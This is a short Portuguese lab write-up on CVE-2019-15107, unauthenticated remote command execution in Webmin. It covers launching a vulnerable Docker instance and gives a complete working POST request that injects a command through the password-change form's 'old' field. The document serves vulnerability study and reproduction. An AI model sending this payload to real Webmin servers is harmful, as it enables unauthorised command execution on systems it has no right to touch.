# Webmin Unauthenticated Remote Code Execution (CVE-2019-15107)

Webmin é uma ferramenta de configuração de sistema baseada na web para sistemas do tipo Unix. A vulnerabilidade existe na página de redefinição de senha, que permite que usuários não autenticados executem comandos arbitrários por meio de uma simples solicitação POST.

Referenciadores:

- https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
- https://www.exploit-db.com/exploits/47230
- https://blog.firosolutions.com/exploits/webmin/

## Iniciar aplicação vulnerável

Inicie um Webmin 1.910 vulnerável através do seguinte comando:

```
docker-compose up -d
```

Após o ambiente ser iniciado, você pode ver a página de login do Webmin em `https://your-ip:10000`.

## Reprodução de vulnerabilidade

A carga útil dos links de referência está incompleta. Depois de ler o código em profundidade, descobri que o comando só pode ser executado se o parâmetro do usuário do corpo não existir antes de 1.920, depois de 1.920, sem limite.

Resumindo, enviando a seguinte solicitação POST para executar o comando `id`:

```
POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

![](1.png)
